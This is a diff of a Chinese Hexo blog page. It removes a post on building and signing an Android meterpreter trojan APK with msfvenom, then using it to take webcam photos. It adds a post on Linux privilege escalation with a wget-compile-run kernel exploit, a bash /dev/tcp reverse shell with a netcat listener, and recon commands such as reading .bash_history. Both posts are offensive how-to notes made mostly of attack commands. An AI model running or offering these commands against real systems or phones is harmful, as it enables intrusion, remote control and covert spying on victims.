@@ -4,7 +4,7 @@
 
 <head>
     <meta charset="utf-8">
-    <meta name="keywords" content="payload, Hexo">
+    <meta name="keywords" content="linux提权, Hexo">
     <meta name="description" content="">
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
@@ -16,7 +16,7 @@
     <!-- Global site tag (gtag.js) - Google Analytics -->
 
 
-    <title>payload | Hexo</title>
+    <title>linux提权 | Hexo</title>
     <link rel="icon" type="image/png" href="/favicon.png">
 
     <link rel="stylesheet" type="text/css" href="/libs/awesome/css/all.css">
@@ -416,12 +416,12 @@
 
 
 
-<div class="bg-cover pd-header post-cover" style="background-image: url('/images/1.jpg')">
+<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/15.jpg')">
     <div class="container" style="right: 0px;left: 0px;">
         <div class="row">
             <div class="col s12 m12 l12">
                 <div class="brand">
-                    <h1 class="description center-align post-title">payload</h1>
+                    <h1 class="description center-align post-title">linux提权</h1>
                 </div>
             </div>
         </div>
@@ -536,29 +536,12 @@
             <div class="row tag-cate">
                 <div class="col s7">
                     
-                    <div class="article-tag">
-                        
-                            <a href="/tags/Android/">
-                                <span class="chip bg-color">Android</span>
-                            </a>
-                        
-                            <a href="/tags/Payload/">
-                                <span class="chip bg-color">Payload</span>
-                            </a>
-                        
-                    </div>
+                          <div class="article-tag">
+                            <span class="chip bg-color">No tag</span>
+                          </div>
                     
                 </div>
                 <div class="col s5 right-align">
-                    
-                    <div class="post-cate">
-                        <i class="fas fa-bookmark fa-fw icon-category"></i>
-                        
-                            <a href="/categories/Payload/" class="post-category">
-                                Payload
-                            </a>
-                        
-                    </div>
                     
                 </div>
             </div>
@@ -567,28 +550,28 @@
                 
                 <div class="post-date info-break-policy">
                     <i class="far fa-calendar-minus fa-fw"></i>Publish Date:&nbsp;&nbsp;
-                    2020-08-18
+                    2020-09-20
                 </div>
                 
 
                 
                 <div class="post-date info-break-policy">
                     <i class="far fa-calendar-check fa-fw"></i>Update Date:&nbsp;&nbsp;
-                    2020-08-19
+                    2020-09-20
                 </div>
                 
 
                 
                 <div class="info-break-policy">
                     <i class="far fa-file-word fa-fw"></i>Word Count:&nbsp;&nbsp;
-                    524
+                    334
                 </div>
                 
 
                 
                 <div class="info-break-policy">
                     <i class="far fa-clock fa-fw"></i>Read Times:&nbsp;&nbsp;
-                    2 Min
+                    1 Min
                 </div>
                 
 
@@ -603,53 +586,22 @@
         <hr class="clearfix">
         <div class="card-content article-card-content">
             <div id="articleContent">
-                <h2 id="开启端口"><a href="#开启端口" class="headerlink" title="开启端口"></a>开启端口</h2><p>打开终端，安装ufw防火墙，开启5555端口</p>
-<figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get install ufw</span><br><span class="line">sudo ufw <span class="built_in">enable</span></span><br><span class="line">sudo ufw allow 5555</span><br></pre></td></tr></tbody></table></figure>
-<h2 id="生成payload-apk文件"><a href="#生成payload-apk文件" class="headerlink" title="生成payload apk文件"></a>生成payload apk文件</h2><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p android/meterpreter/reverse_tcp LHOST=192.168.1.220 LPORT=5555 R &gt; ./a.apk</span><br></pre></td></tr></tbody></table></figure>
+                <h2 id="NFS"><a href="#NFS" class="headerlink" title="NFS"></a>NFS</h2><h2 id="Cron"><a href="#Cron" class="headerlink" title="Cron"></a>Cron</h2><h2 id="文件权限"><a href="#文件权限" class="headerlink" title="文件权限"></a>文件权限</h2><h2 id="内核提权"><a href="#内核提权" class="headerlink" title="内核提权"></a>内核提权</h2><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">wget http://exp/exp.c</span><br><span class="line">gcc -o exp exp.c</span><br><span class="line">chmod +x exp  //可执行权限</span><br><span class="line">./exp</span><br></pre></td></tr></tbody></table></figure>
 
-<p>生成apk后还需用到一下工具优化:<br>1.keytools (密钥、证书管理工具)<br>2.Jarsigner(jar签名、校验工具)<br>3.Zipalign(APK优化攻击)需安装</p>
-<hr>
+<p>bash反弹shell</p>
+<figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bash -i &gt;&amp; /dev/tcp/ip/port 0&gt;&amp;1</span><br></pre></td></tr></tbody></table></figure>
 <ul>
-<li>首先使用keytools生成创建证书:</li>
-</ul>
-<figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">keytool -genkey -v -keystore apk-trojan-key.keystore -<span class="built_in">alias</span> newbie -keyalg RSA -keysize 1024 -validity 999</span><br></pre></td></tr></tbody></table></figure>
-<p>-v 显示密钥库中的证书详细信息<br>-k eystore 指定密钥库的名称<br>-alias 产生别名<br>-keyalg 指定密钥的算法(默认为DSA)<br>-keysize 指定密钥长度<br>-validity 指定创建的证书有效期多少天(默认90)</p>
-<hr>
-<ul>
-<li><p>然后使用jarsigner进行签名:</p>
-<figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">jarsigner -verbose -sigalg SHA1withRSA -digestalg SHA1 -keystore apk-trojan-key.keystore newbie.apk newbie</span><br></pre></td></tr></tbody></table></figure></li>
-<li><p>verbose 签名/验证时输出详细信息</p>
+<li><ol>
+<li>监听7777端口<figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -lvp 7777</span><br></pre></td></tr></tbody></table></figure></li>
+</ol>
 </li>
-<li><p>sigalg  签名算法的名称</p>
-</li>
-<li><p>digestalg 摘要算法的名称</p>
-</li>
-<li><p>keystore 密钥库位置<br><code>进行签名文件+别名</code></p>
-</li>
-<li><p>使用-verify对文件签名验证</p>
-<figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">jarsigner -verify -verbose newbie.apk</span><br></pre></td></tr></tbody></table></figure>
+<li>2.<br>bash -i代表在本地打开一个bash，然后就是/dev/tcp/ip/port， /dev/tcp/是Linux中的一个特殊设备,打开这个文件就相当于发出了一个socket调用，建立一个socket连接，&gt;&amp;后面跟上/dev/tcp/ip/port这个文件代表将标准输出和标准错误输出重定向到这个文件，也就是传递到远程上，如果远程开启了对应的端口去监听，就会接收到这个bash的标准输出和标准错误输出,这个时候我们在本机CentOS输入命令，输出以及错误输出的内容就会被传递显示到远程。<figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bash -i &gt;&amp; /dev/tcp/10.10.223.172/7777 0&gt;&amp;1</span><br></pre></td></tr></tbody></table></figure>
+
+
 
 </li>
 </ul>
-<hr>
-<ul>
-<li>使用Zipalign优化apk (缺少这一步可能导致部分手机会无法安装)<figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">zipalign -v 4 newbie.apk  newbie1.apk</span><br></pre></td></tr></tbody></table></figure>
-
-</li>
-</ul>
-<hr>
-<h2 id="开始监听"><a href="#开始监听" class="headerlink" title="开始监听"></a>开始监听</h2><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">msfconsole</span><br><span class="line"></span><br><span class="line">use exploit/multi/handler //加载攻击模块</span><br><span class="line"><span class="built_in">set</span> payload android/meterpreter/reverse_tcp  //选择要使用的Payload</span><br><span class="line"><span class="built_in">set</span> LHOST 192.168.0.113</span><br><span class="line"><span class="built_in">set</span> LPORT 5555</span><br><span class="line">show options  //查看需要设置的参数</span><br><span class="line"></span><br><span class="line">//注意被侵入对象需要给我们的木马文件一些权限，诸如访问电话，信息，录音，相机，手机存储等权限</span><br><span class="line">exploit  //执行</span><br></pre></td></tr></tbody></table></figure>
-
-<figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">webcam_snap -i 1//前置摄像头采集照片</span><br><span class="line">webcam_snap -i 2 //后置摄像头采集照片</span><br></pre></td></tr></tbody></table></figure>
-
-<p>注意:<code>当有一会时间未及时操作便出现会连接超时，用户需再次点击木马文件，才能继续操作.</code></p>
-<hr>
-<h2 id="查看可以使用的payload类型"><a href="#查看可以使用的payload类型" class="headerlink" title="查看可以使用的payload类型"></a>查看可以使用的payload类型</h2><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -l payloads | more</span><br></pre></td></tr></tbody></table></figure>
-
-
-<hr>
-<p>参考:<br><a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_41453285/article/details/93536347">https://blog.csdn.net/qq_41453285/article/details/93536347</a></p>
-<p><a target="_blank" rel="noopener" href="https://www.jianshu.com/p/e63006a24603">https://www.jianshu.com/p/e63006a24603</a></p>
+<h2 id="程序劫持"><a href="#程序劫持" class="headerlink" title="程序劫持"></a>程序劫持</h2><h2 id="密码"><a href="#密码" class="headerlink" title="密码"></a>密码</h2><h2 id="提取基础命令"><a href="#提取基础命令" class="headerlink" title="提取基础命令"></a>提取基础命令</h2><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">uname -an  //版本信息</span><br><span class="line">id  //当前权限</span><br><span class="line"><span class="built_in">pwd</span>  //当前目录</span><br><span class="line">cat /etc/issue   //版本号,可以更改</span><br><span class="line"></span><br><span class="line">root@q0o0p:/home/q0o0p<span class="comment"># cat .bash_history  //历史记录</span></span><br></pre></td></tr></tbody></table></figure>
 <script>
         document.querySelectorAll('.github-emoji')
           .forEach(el => {
@@ -693,7 +645,7 @@
                     </i>
                 </span>
                 <span class="reprint-info">
-                    <a href="http://yoursite.com/2020/08/18/payload/">http://yoursite.com/2020/08/18/payload/</a>
+                    <a href="http://yoursite.com/2020/09/20/privilgeescalation/">http://yoursite.com/2020/09/20/privilgeescalation/</a>
                 </span>
             </div>
             <div class="reprint__notice">
@@ -730,15 +682,7 @@
                 <div class="post-meta__tag-list" style="display: inline-block;">
                     
                         <div class="article-tag">
-                            
-                                <a href="/tags/Android/">
-                                    <span class="chip bg-color">Android</span>
-                                </a>
-                            
-                                <a href="/tags/Payload/">
-                                    <span class="chip bg-color">Payload</span>
-                                </a>
-                            
+                            <span class="chip bg-color">No tag</span>
                         </div>
                     
                 </div>
@@ -926,32 +870,33 @@
 <article id="prenext-posts" class="prev-next articles">
     <div class="row article-row">
         
-        <div class="article col s12 m6" data-aos="fade-up">
+        <div class="article col s12 m6" data-aos="fade-up" data-aos="fade-up">
             <div class="article-badge left-badge text-color">
-                <i class="fas fa-chevron-left"></i>&nbsp;Previous</div>
+                <i class="far fa-dot-circle"></i>&nbsp;Current
+            </div>
             <div class="card">
-                <a href="/2020/08/18/termux/">
+                <a href="/2020/09/20/privilgeescalation/">
                     <div class="card-image">
                         
                         
-                        <img src="/medias/featureimages/17.jpg" class="responsive-img" alt="termux">
+                        <img src="/medias/featureimages/15.jpg" class="responsive-img" alt="linux提权">
                         
-                        <span class="card-title">termux</span>
+                        <span class="card-title">linux提权</span>
                     </div>
                 </a>
                 <div class="card-content article-content">
                     <div class="summary block-with-text">
                         
-                            
-        document.querySelectorAll('.github-emoji')
-          .forEach(el => {
-            if (!el.dataset.src) { return
+                            NFSCron文件权限内核提权1234wget http://exp/exp.cgcc -o exp exp.cchmod +x exp  //可执行权限./exp
+
+bash反弹shell
+1bash -i &gt;&amp; /dev/
                         
                     </div>
                     <div class="publish-info">
-                        <span class="publish-date">
-                            <i class="far fa-clock fa-fw icon-date"></i>2020-08-18
-                        </span>
+                            <span class="publish-date">
+                                <i class="far fa-clock fa-fw icon-date"></i>2020-09-20
+                            </span>
                         <span class="publish-author">
                             
                             <i class="fas fa-user fa-fw"></i>
@@ -960,6 +905,7 @@
                         </span>
                     </div>
                 </div>
+
                 
             </div>
         </div>
@@ -970,24 +916,24 @@
                 Next&nbsp;<i class="fas fa-chevron-right"></i>
             </div>
             <div class="card">
-                <a href="/1970/01/01/hello-world/">
+                <a href="/2020/08/28/kali-update/">
                     <div class="card-image">
                         
+                        <img src="/images/2.jpg" class="responsive-img" alt="kali-update">
                         
-                        <img src="/medias/featureimages/12.jpg" class="responsive-img" alt="Hello World">
-                        
-                        <span class="card-title">Hello World</span>
+                        <span class="card-title">kali-update</span>
                     </div>
                 </a>
                 <div class="card-content article-content">
                     <div class="summary block-with-text">
                         
-                            Welcome to Hexo! This is your very first post. Check documentation for more info. If you get any problems when using Hex
+                            123//删除C++快捷方式sudo update-alternatives --remove-all gccsudo update-alternatives --remove-all g++
+安装常用工具配置java环境变量phpstud
                         
                     </div>
                     <div class="publish-info">
                             <span class="publish-date">
-                                <i class="far fa-clock fa-fw icon-date"></i>1970-01-01
+                                <i class="far fa-clock fa-fw icon-date"></i>2020-08-28
                             </span>
                         <span class="publish-author">
                             
@@ -996,6 +942,18 @@
                             
                         </span>
                     </div>
+                </div>
+                
+                <div class="card-action article-tags">
+                    
+                    <a href="/tags/outguess/">
+                        <span class="chip bg-color">outguess</span>
+                    </a>
+                    
+                    <a href="/tags/kali/">
+                        <span class="chip bg-color">kali</span>
+                    </a>
+                    
                 </div>
                 
             </div>
